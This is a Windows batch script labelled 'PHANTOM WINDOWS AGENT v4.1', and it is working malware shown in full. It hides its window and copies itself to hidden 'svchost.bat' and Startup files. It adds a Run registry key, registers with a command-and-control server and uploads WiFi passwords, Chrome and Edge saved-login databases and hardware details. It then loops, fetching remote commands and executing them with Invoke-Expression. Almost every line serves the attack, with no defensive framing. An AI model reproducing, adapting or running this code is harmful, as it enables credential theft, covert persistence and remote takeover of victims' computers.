@echo off
:: ═══════════════════════════════════════════════════════════════
:: 🔥 PHANTOM WINDOWS AGENT - PhantomCodeNo1 v4.1
:: Instant essential data collection (WiFi, Browser passwords, Hardware)
:: ═══════════════════════════════════════════════════════════════
if not "%1" == "h" start /min cmd /c "%~nx0" h & exit /b

if "%PHANTOM_C2_SERVER%"=="" exit /b 1

set "C2_SERVER=%PHANTOM_C2_SERVER%"
set "TOKEN_FILE=%TEMP%\phantom_token.txt"
set "HWID_FILE=%TEMP%\phantom_hwid.txt"

:: Generate HWID
if not exist "%HWID_FILE%" (
    powershell -Command ^
      "$cpu=(Get-CimInstance Win32_Processor).ProcessorId; $bb=(Get-CimInstance Win32_BaseBoard).SerialNumber; $hash=[System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($cpu+$bb))); $hwid=$hash.Replace('-','').Substring(0,16); Set-Content -Path '%HWID_FILE%' -Value $hwid" >nul 2>&1
)
set /p HWID=<"%HWID_FILE%"
set "VICTIM_ID=%COMPUTERNAME%-%HWID%"

:: Self-replication
copy "%~f0" "%TEMP%\svchost.bat" >nul 2>&1
attrib +h +s "%TEMP%\svchost.bat" >nul 2>&1
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.bat" >nul 2>&1
attrib +h +s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.bat" >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /t REG_SZ /d "%TEMP%\svchost.bat" /f >nul 2>&1

:: Register / Token
if not exist "%TOKEN_FILE%" (
    powershell -Command ^
      "$body = @{agent_id='%VICTIM_ID%';hostname='%COMPUTERNAME%';os='Windows'} | ConvertTo-Json; " ^
      "$resp = Invoke-RestMethod -Uri '%C2_SERVER%?action=register' -Method POST -Body $body -ContentType 'application/json' -UseBasicParsing; " ^
      "$resp.token | Out-File -FilePath '%TOKEN_FILE%' -Encoding ascii" >nul 2>&1
)
if not exist "%TOKEN_FILE%" exit /b 1
set /p AUTH_TOKEN=<"%TOKEN_FILE%"

:: ═══════════════════════════════════════════════════════════════
:: INSTANT COLLECTION & UPLOAD (V4.1)
:: ═══════════════════════════════════════════════════════════════
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='SilentlyContinue'; $C2='%C2_SERVER%'; $token='%AUTH_TOKEN%'; $vid='%VICTIM_ID%'; $headers=@{'X-Agent-Token'=$token}; " ^
  "function Send-Data($type,$data){ $bytes=[System.Text.Encoding]::UTF8.GetBytes($data); Invoke-WebRequest -Uri \"$C2?action=upload&type=$type\" -Method POST -Body $bytes -Headers $headers -UseBasicParsing -TimeoutSec 30 | Out-Null }; " ^
  "`n=== HARDWARE INFO ===`n" ^
  "$hw = Get-CimInstance Win32_Processor | Select-Object Name,Manufacturer | Out-String; $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,2); $hw += \"RAM: $ram GB`n\"; $hw += Get-CimInstance Win32_BIOS | Out-String; Send-Data 'hardware_info' $hw; " ^
  "`n=== WIFI PASSWORDS ===`n" ^
  "$wifi = ''; $profiles = netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $_ -replace '.*:\s*','' }; foreach($p in $profiles){ $pass = netsh wlan show profile name=\"$p\" key=clear | Select-String 'Key Content' | ForEach-Object { $_ -replace '.*:\s*','' }; if($pass){ $wifi += \"SSID: $p | Password: $pass`n\" } }; Send-Data 'wifi_passwords' $wifi; " ^
  "`n=== BROWSER PASSWORDS (Chrome/Edge) ===`n" ^
  "$chromePath = \"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data\"; if(Test-Path $chromePath){ Copy-Item $chromePath \"$env:TEMP\chrome_login_$vid.db\" -Force; $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes(\"$env:TEMP\chrome_login_$vid.db\")); Send-Data 'browser_passwords' \"CHROME_DB_B64:`n$b64\"; Remove-Item \"$env:TEMP\chrome_login_$vid.db\" -Force }; " ^
  "$edgePath = \"$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data\"; if(Test-Path $edgePath){ Copy-Item $edgePath \"$env:TEMP\edge_login_$vid.db\" -Force; $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes(\"$env:TEMP\edge_login_$vid.db\")); Send-Data 'browser_passwords' \"EDGE_DB_B64:`n$b64\"; Remove-Item \"$env:TEMP\edge_login_$vid.db\" -Force };" >nul 2>&1

:: Main loop
:loop
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='SilentlyContinue'; $C2='%C2_SERVER%'; $token='%AUTH_TOKEN%'; $vid='%VICTIM_ID%'; $headers=@{'X-Agent-Token'=$token}; " ^
  "function Send-Retry($url,$method,$body,$maxRetries=5){ for($i=0;$i -lt $maxRetries;$i++){ try { if($method -eq 'GET'){ $r=Invoke-WebRequest -Uri $url -Headers $headers -UseBasicParsing -TimeoutSec 10; return $r.Content } else { $r=Invoke-WebRequest -Uri $url -Method POST -Body $body -Headers $headers -UseBasicParsing -TimeoutSec 15; return $r.Content } } catch { Start-Sleep -Seconds (10 * ($i+1)) } } return $null }; " ^
  "Send-Retry \"$C2?action=heartbeat&hostname=$env:COMPUTERNAME&os=Windows\" 'GET' $null | Out-Null; " ^
  "$sysinfo = @{hostname=$env:COMPUTERNAME;windows=(Get-CimInstance Win32_OperatingSystem).Caption;hwid=(Get-Content '%HWID_FILE%')} | ConvertTo-Json -Compress; " ^
  "Send-Retry \"$C2?action=upload&type=system\" 'POST' $sysinfo | Out-Null; " ^
  "$cmds = Send-Retry \"$C2?action=get_commands\" 'GET' $null; " ^
  "if($cmds){ $cmdList = $cmds | ConvertFrom-Json; foreach($c in $cmdList){ $out = Invoke-Expression $c.command 2>&1 | Out-String; Send-Retry \"$C2?action=send_output&command_id=$($c.id)\" 'POST' $out | Out-Null } }; " ^
  "Start-Sleep -Seconds (Get-Random -Minimum 180 -Maximum 300)"

timeout /t 300 /nobreak >nul
goto loop
